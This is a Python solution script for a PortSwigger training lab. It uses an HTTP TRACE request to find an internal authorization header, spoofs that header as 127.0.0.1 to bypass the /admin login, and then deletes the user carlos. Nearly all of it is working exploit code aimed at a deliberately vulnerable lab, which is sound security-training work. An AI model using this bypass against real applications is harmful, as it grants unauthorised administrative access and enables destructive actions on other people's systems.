# Lab 04 — Authentication bypass via information disclosure
# PortSwigger: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass
#
# Vulnerability: The TRACE HTTP method is enabled and echoes the full
#                request back in the response — including a custom header
#                (X-Custom-IP-Authorization) added by front-end
#                infrastructure, revealing an internal-only IP-based
#                authorization mechanism
# Aim:           Discover the header name via TRACE, use it to bypass
#                /admin authentication, and delete carlos
#
# Technique:
#   TRACE /login  → response body echoes the FULL request verbatim,
#                    including infrastructure-injected headers we never
#                    sent ourselves
#   → discover: X-Custom-IP-Authorization
#   GET /admin  with  X-Custom-IP-Authorization: 127.0.0.1
#   → the app trusts this header to mean "internal/authorized request"
#
# Usage: python information_disclosure_lab04.py <url>

import sys
import re
import urllib3
from proxies import proxies
from information_disclosure_utils import banner, section, make_session, check_status, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 04 — AUTHENTICATION BYPASS VIA INFORMATION DISCLOSURE (TRACE)")

    if len(sys.argv) != 2:
        print("  Usage: python information_disclosure_lab04.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    # ── Step 1: confirm /admin is blocked normally ───────────────────────────
    print("  ── Step 1: confirm /admin is blocked without any special header\n")
    r_blocked = session.get(f"{url}/admin")
    check_status(r_blocked, 401, "GET /admin (no auth)")

    # ── Step 2: send a TRACE request to discover echoed infrastructure headers
    print("\n  ── Step 2: send TRACE /login to discover infrastructure headers\n")
    r_trace = session.request("TRACE", f"{url}/login")
    print(f"  ℹ  TRACE status: {r_trace.status_code}\n")

    header_match = re.search(r'(X-Custom-[A-Za-z0-9-]+):\s*([^\r\n]+)', r_trace.text)
    if not header_match:
        # broaden the search to any unusual custom header echoed back
        header_match = re.search(r'(X-[A-Za-z0-9-]+):\s*([^\r\n]+)', r_trace.text)

    if not header_match:
        print("  ✘  Could not auto-extract a custom header from the TRACE response.")
        print_box("Raw TRACE response (truncated)", r_trace.text[:1000])
        sys.exit(1)

    header_name = header_match.group(1)
    header_value_seen = header_match.group(2).strip()
    print(f"  ✔  Discovered header: {header_name}: {header_value_seen}")
    print(f"     (this header was NEVER sent by us — added by front-end infra)\n")

    # ── Step 3: use the discovered header to bypass /admin auth ─────────────
    print(f"  ── Step 3: bypass /admin using {header_name}: 127.0.0.1\n")
    r_bypass = session.get(f"{url}/admin", headers={header_name: "127.0.0.1"})
    check_status(r_bypass, 200, f"GET /admin with {header_name}: 127.0.0.1")

    if "carlos" not in r_bypass.text:
        print("  ?  'carlos' not visible on admin panel — inspect manually")
        sys.exit(0)

    # ── Step 4: delete carlos, carrying the bypass header on every request ──
    print("\n  ── Step 4: delete carlos (carrying the bypass header)\n")
    r_delete = session.post(
        f"{url}/admin/delete",
        data={"username": "carlos"},
        headers={header_name: "127.0.0.1"}
    )
    check_status(r_delete, [200, 302], "Delete carlos")

    print()
    print("  ℹ  TRACE echoes the FULL request the server actually received —")
    print("     including headers added by any intermediate proxy/load")
    print("     balancer BEFORE the request reached the application. This")
    print("     revealed a header the app trusts for authorization that a")
    print("     normal client would have no way to discover otherwise.")
